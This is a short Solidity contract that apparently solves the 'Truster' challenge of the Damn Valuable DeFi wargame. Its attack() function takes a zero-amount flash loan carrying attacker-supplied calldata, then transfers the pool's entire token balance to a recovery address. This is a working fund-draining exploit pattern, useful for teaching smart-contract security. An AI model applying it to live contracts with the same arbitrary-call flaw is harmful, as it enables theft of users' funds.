// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract FlashLoanReceiver {
  TrusterLenderPool public pool;
  DamnValuableToken public token;
  address public owner;

  constructor(address _pool, address _token, address _owner) {
    pool = TrusterLenderPool(_pool);
    token = DamnValuableToken(_token);
    owner = _owner;
  }

  function attack(bytes calldata _data, address _recovery) public {
    pool.flashLoan(0, msg.sender, address(token), _data);
    token.transferFrom(address(pool), _recovery, token.balanceOf(address(pool)));
  }
}